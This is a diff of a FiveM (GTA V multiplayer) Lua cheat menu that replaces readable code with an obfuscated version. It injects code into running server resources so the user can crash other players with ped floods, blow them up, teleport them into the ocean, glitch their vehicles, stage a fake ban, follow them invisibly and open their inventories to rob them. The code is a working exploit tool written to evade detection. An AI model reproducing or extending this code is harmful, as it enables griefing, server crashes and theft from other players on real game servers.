+        ]],v325,v325));else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v99=MachoMenuInputbox(v91,"Target Player ID (To Ocean)","e.g., 123");MachoMenuButton(v91,"Teleport to Ocean",function() local v326=0 -0 ;local v327;while true do if ((0 + 0)==v326) then v327=tonumber(MachoMenuGetInputbox(v99));if (v327 and (v327>0)) then MachoMenuNotification("Ocean","Sending player ID: "   .. v327   .. " to ocean" );local v823=nil;if (GetResourceState("monitor")=="started") then v823="monitor";elseif (GetResourceState("qb-core")=="started") then v823="qb-core";else v823="ox_inventory";end MachoInjectResource2(NewThreadNs,v823,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3148,19 +987,7 @@ MachoMenuButton(PlayerManipSection, "Teleport to Ocean", function()
             local targetName = GetPlayerName(targetPlayer)
             print("Ocean: Sent " .. targetName .. " to ocean")
             TriggerEvent('chat:addMessage', { args = { '^2Ocean:', 'Sent ' .. targetName .. ' to the ocean!' } })
-        ]], targetId, targetId))
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Glitch Vehicle on Selected Player
-local GlitchTargetIdInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Glitch Vehicle)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Glitch Vehicle", function()
-    local targetId = tonumber(MachoMenuGetInputbox(GlitchTargetIdInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoInjectResource('monitor', string.format([[
+        ]],v327,v327));else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v100=MachoMenuInputbox(v91,"Target Player ID (Glitch Vehicle)","e.g., 123");MachoMenuButton(v91,"Glitch Vehicle",function() local v328=0;local v329;while true do if (v328==0) then v329=tonumber(MachoMenuGetInputbox(v100));if (v329 and (v329>(0 -0))) then local v824=0;while true do if (0==v824) then MachoInjectResource("monitor",string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3281,23 +1108,7 @@ MachoMenuButton(PlayerManipSection, "Glitch Vehicle", function()
             SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, true, true, false, true)
             
             TriggerEvent('chat:addMessage', { args = { '^2Glitch Vehicle:', 'Vehicle glitched on ' .. targetName .. ' (ID: %d)' } })
-        ]], targetId, targetId, targetId, targetId))
-        
-        MachoMenuNotification("Glitch Vehicle", "Vehicle glitch initiated on ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- s1 Ban Player (Fixed)
-local BanPlayerInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Ban)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "s1 Ban Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(BanPlayerInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("s1 Ban", "Ban effect initiating on ID: " .. targetId)
-        
-        MachoInjectResource('monitor', string.format([[
+        ]],v329,v329,v329,v329));MachoMenuNotification("Glitch Vehicle","Vehicle glitch initiated on ID: "   .. v329 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v101=MachoMenuInputbox(v91,"Target Player ID (Ban)","e.g., 123");MachoMenuButton(v91,"s1 Ban Player",function() local v330=tonumber(MachoMenuGetInputbox(v101));if (v330 and (v330>0)) then local v546=17 -(12 + 5) ;while true do if (v546==(0 -0)) then MachoMenuNotification("s1 Ban","Ban effect initiating on ID: "   .. v330 );MachoInjectResource("monitor",string.format([[
             local targetServerId = %d
             print("s1 Ban: Target ID " .. targetServerId)
             
@@ -3402,43 +1213,7 @@ MachoMenuButton(PlayerManipSection, "s1 Ban Player", function()
             end
             
             SetModelAsNoLongerNeeded(vehicleModel)
-        ]], targetId, targetId, targetId, targetId))
-        
-        MachoMenuNotification("s1 Ban", "Ban effect sent to ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Crash V1 (Ped Flood)
-local CrashV1InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Crash V1)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Crash V1 (Ped Flood)", function()
-    local targetId = tonumber(MachoMenuGetInputbox(CrashV1InputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Crash V1", "Invisible crasher deploying on ID: " .. targetId)
-        
-        -- Try to find a working resource to inject into
-local targetResource = nil
-if GetResourceState('monitor') == "started" then
-    targetResource = 'monitor'
-elseif GetResourceState('qb-core') == "started" then
-    targetResource = 'qb-core'
-elseif GetResourceState('es_extended') == "started" then
-    targetResource = 'es_extended'
-elseif GetResourceState('m3-apartments') == "started" then
-    targetResource = 'm3-apartments'
-elseif GetResourceState('m3-inventory') == "started" then
-    targetResource = 'm3-inventory'
-elseif GetResourceState('m3-hud') == "started" then
-    targetResource = 'm3-hud'
-elseif GetResourceState('ox_inventory') == "started" then
-    targetResource = 'ox_inventory'
-else
-    targetResource = 'qb-core' -- fallback
-end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v330,v330,v330,v330));v546=1 -0 ;end if ((1 -0)==v546) then MachoMenuNotification("s1 Ban","Ban effect sent to ID: "   .. v330 );break;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v102=MachoMenuInputbox(v91,"Target Player ID (Crash V1)","e.g., 123");MachoMenuButton(v91,"Crash V1 (Ped Flood)",function() local v331=tonumber(MachoMenuGetInputbox(v102));if (v331 and (v331>(0 -0))) then MachoMenuNotification("Crash V1","Invisible crasher deploying on ID: "   .. v331 );local v547=nil;if (GetResourceState("monitor")=="started") then v547="monitor";elseif (GetResourceState("qb-core")=="started") then v547="qb-core";elseif (GetResourceState("es_extended")=="started") then v547="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v547="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v547="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v547="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v547="ox_inventory";else v547="qb-core";end MachoInjectResource2(NewThreadNs,v547,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3533,43 +1308,7 @@ end
                 print("Crash V1: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Crash V1:', 'Failed to load model!' } })
             end
-        ]], targetId))
-        
-        MachoMenuNotification("Crash V1", "Invisible crasher deployed on ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Whale on Player
-local WhaleInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Whale)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Whale on Player", function()
-    local targetId = tonumber(MachoMenuGetInputbox(WhaleInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Whale", "Spawning whale on ID: " .. targetId)
-        
-        -- Try to find a working resource to inject into
-local targetResource = nil
-if GetResourceState('monitor') == "started" then
-    targetResource = 'monitor'
-elseif GetResourceState('qb-core') == "started" then
-    targetResource = 'qb-core'
-elseif GetResourceState('es_extended') == "started" then
-    targetResource = 'es_extended'
-elseif GetResourceState('m3-apartments') == "started" then
-    targetResource = 'm3-apartments'
-elseif GetResourceState('m3-inventory') == "started" then
-    targetResource = 'm3-inventory'
-elseif GetResourceState('m3-hud') == "started" then
-    targetResource = 'm3-hud'
-elseif GetResourceState('ox_inventory') == "started" then
-    targetResource = 'ox_inventory'
-else
-    targetResource = 'qb-core' -- fallback
-end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v331));MachoMenuNotification("Crash V1","Invisible crasher deployed on ID: "   .. v331 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v103=MachoMenuInputbox(v91,"Target Player ID (Whale)","e.g., 123");MachoMenuButton(v91,"Whale on Player",function() local v332=0 + 0 ;local v333;while true do if (v332==(1973 -(1656 + 317))) then v333=tonumber(MachoMenuGetInputbox(v103));if (v333 and (v333>(0 + 0))) then local v825=0 + 0 ;local v826;while true do if (v825==(0 -0)) then MachoMenuNotification("Whale","Spawning whale on ID: "   .. v333 );v826=nil;v825=1;end if (v825==2) then MachoMenuNotification("Whale","Whale spawn sent to ID: "   .. v333 );break;end if (v825==(4 -3)) then if (GetResourceState("monitor")=="started") then v826="monitor";elseif (GetResourceState("qb-core")=="started") then v826="qb-core";elseif (GetResourceState("es_extended")=="started") then v826="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v826="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v826="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v826="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v826="ox_inventory";else v826="qb-core";end MachoInjectResource2(NewThreadNs,v826,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3636,99 +1375,16 @@ end
                 print("Whale: Failed to load whale model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Whale:', 'Failed to load whale model!' } })
             end
-        ]], targetId, targetId, targetId))
-        
-        MachoMenuNotification("Whale", "Whale spawn sent to ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- Uncuff Near Player
-MachoMenuButton(PlayerManipSection, "Uncuff Near Player", function()
-    -- Try to find a working resource to inject into
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    elseif GetResourceState('es_extended') == "started" then
-        targetResource = 'es_extended'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+        ]],v333,v333,v333));v825=2;end end else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);MachoMenuButton(v91,"Uncuff Near Player",function() local v334=354 -(5 + 349) ;local v335;while true do if ((4 -3)==v334) then MachoInjectResource2(NewThreadNs,v335,[[
         TriggerEvent('police:client:UnCuffPlayer', 'handcuffs')
         print("Uncuff Near Player triggered")
         TriggerEvent('chat:addMessage', { args = { '^2Uncuff:', 'Attempted to uncuff nearby player!' } })
-    ]])
-    
-    MachoMenuNotification("Uncuff", "Attempted to uncuff nearby player!")
-end)
-
--- Medkit Revive (On Selected Player)
-local MedkitReviveInputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Medkit Revive)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "Medkit Revive", function()
-    local targetId = tonumber(MachoMenuGetInputbox(MedkitReviveInputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Medkit Revive", "Reviving player ID: " .. targetId)
-        
-        -- Try direct trigger first
-        local success = false
-        pcall(function()
-            TriggerServerEvent('medkit:revivePlayer', targetId)
-            success = true
-        end)
-        
-        -- If direct fails, inject into a resource
-        if not success then
-            local targetResource = nil
-            if GetResourceState('monitor') == "started" then
-                targetResource = 'monitor'
-            elseif GetResourceState('qb-core') == "started" then
-                targetResource = 'qb-core'
-            elseif GetResourceState('es_extended') == "started" then
-                targetResource = 'es_extended'
-            else
-                targetResource = 'ox_inventory'
-            end
-            
-            MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+    ]]);MachoMenuNotification("Uncuff","Attempted to uncuff nearby player!");break;end if (v334==(1271 -(266 + 1005))) then v335=nil;if (GetResourceState("monitor")=="started") then v335="monitor";elseif (GetResourceState("qb-core")=="started") then v335="qb-core";elseif (GetResourceState("es_extended")=="started") then v335="es_extended";else v335="ox_inventory";end v334=1 + 0 ;end end end);local v104=MachoMenuInputbox(v91,"Target Player ID (Medkit Revive)","e.g., 123");MachoMenuButton(v91,"Medkit Revive",function() local v336=tonumber(MachoMenuGetInputbox(v104));if (v336 and (v336>(0 -0))) then MachoMenuNotification("Medkit Revive","Reviving player ID: "   .. v336 );local v548=false;pcall(function() TriggerServerEvent("medkit:revivePlayer",v336);v548=true;end);if  not v548 then local v780=0 -0 ;local v781;while true do if (v780==(1697 -(561 + 1135))) then MachoInjectResource2(NewThreadNs,v781,string.format([[
                 local targetServerId = %d
                 TriggerServerEvent('medkit:revivePlayer', targetServerId)
                 print("Medkit Revive: Revived player ID: " .. targetServerId)
                 TriggerEvent('chat:addMessage', { args = { '^2Medkit Revive:', 'Revived player ID: ' .. targetServerId } })
-            ]], targetId))
-        end
-        
-        MachoMenuNotification("Medkit Revive", "Revive sent to ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- S1 Explode Player Method 1 (Phone Explosive)
-local ExplodeMethod1InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Explode M1)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 1", function()
-    local targetId = tonumber(MachoMenuGetInputbox(ExplodeMethod1InputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Explode M1", "Exploding player ID: " .. targetId)
-        
-        local targetResource = nil
-        if GetResourceState('monitor') == "started" then
-            targetResource = 'monitor'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        elseif GetResourceState('qb-core') == "started" then
-            targetResource = 'qb-core'
-        else
-            targetResource = 'qb-core'
-        end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+            ]],v336));break;end if (v780==(0 -0)) then v781=nil;if (GetResourceState("monitor")=="started") then v781="monitor";elseif (GetResourceState("qb-core")=="started") then v781="qb-core";elseif (GetResourceState("es_extended")=="started") then v781="es_extended";else v781="ox_inventory";end v780=1;end end end MachoMenuNotification("Medkit Revive","Revive sent to ID: "   .. v336 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v105=MachoMenuInputbox(v91,"Target Player ID (Explode M1)","e.g., 123");MachoMenuButton(v91,"S1 Explode Player Method 1",function() local v337=tonumber(MachoMenuGetInputbox(v105));if (v337 and (v337>(0 -0))) then MachoMenuNotification("Explode M1","Exploding player ID: "   .. v337 );local v549=nil;if (GetResourceState("monitor")=="started") then v549="monitor";elseif (GetResourceState("qb-core")=="started") then v549="qb-core";elseif (GetResourceState("qb-core")=="started") then v549="qb-core";else v549="qb-core";end MachoInjectResource2(NewThreadNs,v549,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3786,42 +1442,7 @@ MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 1", function()
                 print("Explode M1: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Explode M1:', 'Failed to load model!' } })
             end
-        ]], targetId, targetId, targetId))
-        
-        MachoMenuNotification("Explode M1", "Explosion sent to ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- S1 Explode Player Method 2 (Volatus Drop)
-local ExplodeMethod2InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Explode M2)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 2", function()
-    local targetId = tonumber(MachoMenuGetInputbox(ExplodeMethod2InputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Explode M2", "Exploding player ID: " .. targetId)
-        
-local targetResource = nil
-if GetResourceState('monitor') == "started" then
-    targetResource = 'monitor'
-elseif GetResourceState('qb-core') == "started" then
-    targetResource = 'qb-core'
-elseif GetResourceState('es_extended') == "started" then
-    targetResource = 'es_extended'
-elseif GetResourceState('m3-apartments') == "started" then
-    targetResource = 'm3-apartments'
-elseif GetResourceState('m3-inventory') == "started" then
-    targetResource = 'm3-inventory'
-elseif GetResourceState('m3-hud') == "started" then
-    targetResource = 'm3-hud'
-elseif GetResourceState('ox_inventory') == "started" then
-    targetResource = 'ox_inventory'
-else
-    targetResource = 'qb-core' -- fallback
-end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v337,v337,v337));MachoMenuNotification("Explode M1","Explosion sent to ID: "   .. v337 );else MachoMenuNotification("Error","Please enter a valid player ID!");end end);local v106=MachoMenuInputbox(v91,"Target Player ID (Explode M2)","e.g., 123");MachoMenuButton(v91,"S1 Explode Player Method 2",function() local v338=0;local v339;while true do if (v338==0) then v339=tonumber(MachoMenuGetInputbox(v106));if (v339 and (v339>(1066 -(507 + 559)))) then MachoMenuNotification("Explode M2","Exploding player ID: "   .. v339 );local v827=nil;if (GetResourceState("monitor")=="started") then v827="monitor";elseif (GetResourceState("qb-core")=="started") then v827="qb-core";elseif (GetResourceState("es_extended")=="started") then v827="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v827="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v827="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v827="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v827="ox_inventory";else v827="qb-core";end MachoInjectResource2(NewThreadNs,v827,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3878,42 +1499,7 @@ end
                 print("Explode M2: Failed to load model!")
                 TriggerEvent('chat:addMessage', { args = { '^1Explode M2:', 'Failed to load model!' } })
             end
-        ]], targetId, targetId, targetId))
-        
-        MachoMenuNotification("Explode M2", "Explosion sent to ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
--- S1 Explode Player Method 3 (Owned Explosion)
-local ExplodeMethod3InputBoxHandle = MachoMenuInputbox(PlayerManipSection, "Target Player ID (Explode M3)", "e.g., 123")
-
-MachoMenuButton(PlayerManipSection, "S1 Explode Player Method 3", function()
-    local targetId = tonumber(MachoMenuGetInputbox(ExplodeMethod3InputBoxHandle))
-    if targetId and targetId > 0 then
-        MachoMenuNotification("Explode M3", "Exploding player ID: " .. targetId)
-        
-local targetResource = nil
-if GetResourceState('monitor') == "started" then
-    targetResource = 'monitor'
-elseif GetResourceState('qb-core') == "started" then
-    targetResource = 'qb-core'
-elseif GetResourceState('es_extended') == "started" then
-    targetResource = 'es_extended'
-elseif GetResourceState('m3-apartments') == "started" then
-    targetResource = 'm3-apartments'
-elseif GetResourceState('m3-inventory') == "started" then
-    targetResource = 'm3-inventory'
-elseif GetResourceState('m3-hud') == "started" then
-    targetResource = 'm3-hud'
-elseif GetResourceState('ox_inventory') == "started" then
-    targetResource = 'ox_inventory'
-else
-    targetResource = 'qb-core' -- fallback
-end
-        
-        MachoInjectResource2(NewThreadNs, targetResource, string.format([[
+        ]],v339,v339,v339));MachoMenuNotification("Explode M2","Explosion sent to ID: "   .. v339 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v107=MachoMenuInputbox(v91,"Target Player ID (Explode M3)","e.g., 123");MachoMenuButton(v91,"S1 Explode Player Method 3",function() local v340=0;local v341;while true do if (v340==(0 -0)) then v341=tonumber(MachoMenuGetInputbox(v107));if (v341 and (v341>0)) then MachoMenuNotification("Explode M3","Exploding player ID: "   .. v341 );local v828=nil;if (GetResourceState("monitor")=="started") then v828="monitor";elseif (GetResourceState("qb-core")=="started") then v828="qb-core";elseif (GetResourceState("es_extended")=="started") then v828="es_extended";elseif (GetResourceState("m3-apartments")=="started") then v828="m3-apartments";elseif (GetResourceState("m3-inventory")=="started") then v828="m3-inventory";elseif (GetResourceState("m3-hud")=="started") then v828="m3-hud";elseif (GetResourceState("ox_inventory")=="started") then v828="ox_inventory";else v828="qb-core";end MachoInjectResource2(NewThreadNs,v828,string.format([[
             local targetServerId = %d
             local targetPlayer = GetPlayerFromServerId(targetServerId)
             
@@ -3944,115 +1530,7 @@ end
             local targetName = GetPlayerName(targetPlayer)
             print("Explode M3: Exploded " .. targetName)
             TriggerEvent('chat:addMessage', { args = { '^1Explode M3:', 'Exploded ' .. targetName .. ' Method 3' } })
-        ]], targetId, targetId, targetId))
-        
-        MachoMenuNotification("Explode M3", "Explosion sent to ID: " .. targetId)
-    else
-        MachoMenuNotification("Error", "Please enter a valid player ID!")
-    end
-end)
-
-local robbing = false
-local takip = false
-local attachedTo = nil
-local attachedTo2 = nil
-local attachedTo3 = nil
-local originalPos = nil
-local originalPos2 = nil
-local originalPos3 = nil
-local isInvisible = false
-local isInvisible2 = false
-local isInvisible3 = false
-
--- Invisibility Function
-local function SetTrueInvisibility(state)
-    local playerPed = PlayerPedId()
-    if state then
-        SetEntityVisible(playerPed, false, false)
-        NetworkSetEntityInvisibleToNetwork(playerPed, true)
-        SetEntityAlpha(playerPed, 0, false)
-        isInvisible = true
-    else
-        SetEntityVisible(playerPed, true, false)
-        NetworkSetEntityInvisibleToNetwork(playerPed, false)
-        ResetEntityAlpha(playerPed)
-        isInvisible = false
-    end
-end
-
--- Stay visible to self
-CreateThread(function()
-    while true do
-        Wait(0)
-        if isInvisible then
-            local ped = PlayerPedId()
-            SetEntityLocallyVisible(ped)
-            SetEntityAlpha(ped, 255, false)
-        end
-    end
-end)
-
--- MachoMenu inputbox
-local takipInput = MachoMenuInputbox(PlayerManipSection, "Follow ID", "Target Player ID")
-
--- FOLLOW button
-MachoMenuButton(PlayerManipSection, "Follow/Leave", function()
-    if takip then
-        local playerPed = PlayerPedId()
-        takip = false
-        DetachEntity(playerPed, true, false)
-        SetTrueInvisibility(false)
-        if DoesEntityExist(attachedTo2) then
-            ClearPedTasks(attachedTo2)
-        end
-        attachedTo2 = nil
-        if originalPos2 then
-            SetEntityCoords(playerPed, originalPos2.x, originalPos2.y, originalPos2.z, false, false, false, false)
-        end
-        MachoInjectResource('monitor', [[
-            local playerPed = PlayerPedId()
-            local playerVeh = GetVehiclePedIsIn(playerPed, false)
-    
-            -- Make visible
-            SetEntityVisible(playerPed, true, false)
-            NetworkSetEntityInvisibleToNetwork(playerPed, false)
-            ResetEntityAlpha(playerPed)
-    
-            if playerVeh ~= 0 then
-                SetEntityVisible(playerVeh, true, false)
-                NetworkSetEntityInvisibleToNetwork(playerVeh, false)
-                ResetEntityAlpha(playerVeh)
-            end
-        ]])
-        isInvisible2 = false
-        MachoMenuNotification("Follow", "Follow left and returned.")
-        return
-    end
-
-    local targetId = tonumber(MachoMenuGetInputbox(takipInput))
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid ID!")
-        return
-    end
-
-    local playerId = GetPlayerFromServerId(targetId)
-    if playerId == -1 then
-        MachoMenuNotification("Error", "Player not found.")
-        return
-    end
-
-    local playerPed = PlayerPedId()
-    local targetPed = GetPlayerPed(playerId)
-    if not DoesEntityExist(targetPed) then
-        MachoMenuNotification("Error", "Target ped doesn't exist.")
-        return
-    end
-
-    takip = true
-    attachedTo2 = targetPed
-    originalPos2 = GetEntityCoords(playerPed)
-
-    MachoInjectResource('monitor', [[
+        ]],v341,v341,v341));MachoMenuNotification("Explode M3","Explosion sent to ID: "   .. v341 );else MachoMenuNotification("Error","Please enter a valid player ID!");end break;end end end);local v108=false;local v109=false;local v110=nil;local v111=nil;local v112=nil;local v113=nil;local v114=nil;local v115=nil;local v14=false;local v15=false;local v116=false;local function v117(v342) local v343=0 -0 ;local v344;while true do if (v343==(388 -(212 + 176))) then v344=PlayerPedId();if v342 then local v829=905 -(250 + 655) ;while true do if (v829==(0 -0)) then SetEntityVisible(v344,false,false);NetworkSetEntityInvisibleToNetwork(v344,true);v829=1;end if ((1 -0)==v829) then SetEntityAlpha(v344,0 -0 ,false);v14=true;break;end end else SetEntityVisible(v344,true,false);NetworkSetEntityInvisibleToNetwork(v344,false);ResetEntityAlpha(v344);v14=false;end break;end end end CreateThread(function() while true do local v501=1956 -(1869 + 87) ;while true do if (v501==(0 -0)) then Wait(1901 -(484 + 1417) );if v14 then local v883=PlayerPedId();SetEntityLocallyVisible(v883);SetEntityAlpha(v883,255,false);end break;end end end end);local v118=MachoMenuInputbox(v91,"Follow ID","Target Player ID");MachoMenuButton(v91,"Follow/Leave",function() local v345=0 -0 ;local v346;local v347;local v348;local v349;while true do if (v345==3) then v111=v349;v114=GetEntityCoords(v348);MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         local playerVeh = GetVehiclePedIsIn(playerPed, false)
 
@@ -4075,142 +1553,21 @@ MachoMenuButton(PlayerManipSection, "Follow/Leave", function()
             SetEntityLocallyVisible(playerVeh)
             SetEntityAlpha(playerVeh, 255, false)
         end
-    ]])
-    isInvisible2 = true
-
-    AttachEntityToEntity(playerPed, targetPed, 11816, 0.5, -2.0, 2.0, 0.0, 0.0, 0.0, false, false, false, false, 1, true)
-
-    -- Follow monitoring thread
-    CreateThread(function()
-        while takip do
-            Wait(5)
-            if IsPauseMenuActive() then
-                takip = false
-                DetachEntity(playerPed, true, false)
-                SetTrueInvisibility(false)
-                if DoesEntityExist(attachedTo2) then
-                    ClearPedTasks(attachedTo2)
-                end
-                if originalPos then
-                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, false)
-                end
-                attachedTo2 = nil
-                MachoMenuNotification("Follow", "Follow ended, returned to position.")
-            end
-
-            if isInvisible2 then
-                local playerPed = PlayerPedId()
+    ]]);v345=4;end if (v345==0) then if v109 then local v830=PlayerPedId();v109=false;DetachEntity(v830,true,false);v117(false);if DoesEntityExist(v111) then ClearPedTasks(v111);end v111=nil;if v114 then SetEntityCoords(v830,v114.x,v114.y,v114.z,false,false,false,false);end MachoInjectResource("monitor",[[
+            local playerPed = PlayerPedId()
+            local playerVeh = GetVehiclePedIsIn(playerPed, false)
     
-                SetEntityVisible(playerPed, false, false)
-                NetworkSetEntityInvisibleToNetwork(playerPed, true)
-                SetEntityAlpha(playerPed, 0, false)
+            -- Make visible
+            SetEntityVisible(playerPed, true, false)
+            NetworkSetEntityInvisibleToNetwork(playerPed, false)
+            ResetEntityAlpha(playerPed)
     
-                SetEntityLocallyVisible(playerPed)
-                SetEntityAlpha(playerPed, 255, false)
+            if playerVeh ~= 0 then
+                SetEntityVisible(playerVeh, true, false)
+                NetworkSetEntityInvisibleToNetwork(playerVeh, false)
+                ResetEntityAlpha(playerVeh)
             end
-        end
-    end)
-end)
-
--- FOLLOW AND OPEN INVENTORY button
-MachoMenuButton(PlayerManipSection, "Follow and Open Inventory / Leave", function()
-    if robbing then
-        local playerPed = PlayerPedId()
-        robbing = false
-        DetachEntity(playerPed, true, false)
-        SetTrueInvisibility(false)
-        if DoesEntityExist(attachedTo) then
-            ClearPedTasks(attachedTo)
-        end
-        attachedTo = nil
-        if originalPos then
-            SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, false)
-        end
-        -- Reset visibility settings
-        SetEntityVisible(playerPed, true, false)
-        NetworkSetEntityInvisibleToNetwork(playerPed, false)
-        ResetEntityAlpha(playerPed)
-        isInvisible3 = false
-        MachoMenuNotification("Follow", "Follow left and returned.")
-        return
-    end
-
-    local targetId = tonumber(MachoMenuGetInputbox(takipInput))
-    if not targetId or targetId <= 0 then
-        MachoMenuNotification("Error", "Please enter a valid ID!")
-        return
-    end
-
-    local playerId = GetPlayerFromServerId(targetId)
-    if playerId == -1 then
-        MachoMenuNotification("Error", "Player not found.")
-        return
-    end
-
-    local playerPed = PlayerPedId()
-    local targetPed = GetPlayerPed(playerId)
-    if not DoesEntityExist(targetPed) then
-        MachoMenuNotification("Error", "Target ped doesn't exist.")
-        return
-    end
-
-    robbing = true
-    attachedTo = targetPed
-    originalPos = GetEntityCoords(playerPed)
-
-    -- Invisibility settings
-    SetEntityVisible(playerPed, false, false)
-    NetworkSetEntityInvisibleToNetwork(playerPed, true)
-    SetEntityAlpha(playerPed, 0, false)
-
-    isInvisible3 = true
-
-    AttachEntityToEntity(playerPed, targetPed, 11816, 0.5, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
-
-    -- Animation
-    local dict, anim = "missminuteman_1ig_2", "handsup_base"
-    RequestAnimDict(dict)
-    while not HasAnimDictLoaded(dict) do Wait(0) end
-    TaskPlayAnim(targetPed, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
-
-    -- Follow monitoring thread
-    CreateThread(function()
-        while robbing do
-            Wait(5)
-            if IsPauseMenuActive() then
-                robbing = false
-                DetachEntity(playerPed, true, false)
-                SetTrueInvisibility(false)
-                if DoesEntityExist(attachedTo) then
-                    ClearPedTasks(attachedTo)
-                end
-                if originalPos then
-                    SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, false)
-                end
-                attachedTo = nil
-                isInvisible3 = false
-                MachoMenuNotification("Follow", "Follow ended, returned to position.")
-            end
-            if isInvisible3 then
-                local playerPed55 = PlayerPedId()
-    
-                SetEntityVisible(playerPed55, false, false)
-                NetworkSetEntityInvisibleToNetwork(playerPed55, true)
-                SetEntityAlpha(playerPed55, 0, false)
-    
-                SetEntityLocallyVisible(playerPed55)
-                SetEntityAlpha(playerPed55, 255, false)
-            end
-        end
-    end)
-
-    -- Open inventory (try twice)
-    TriggerEvent('ox_inventory:openInventory', 'otherplayer', targetId)
-end)
-
--- Open Nearby Player's Inventory (OX Version - keeps working)
-MachoMenuButton(PlayerManipSection, "Open Nearby Player's Inventory (OX)", function()
-    MachoInjectResource('m3-inventory', [[
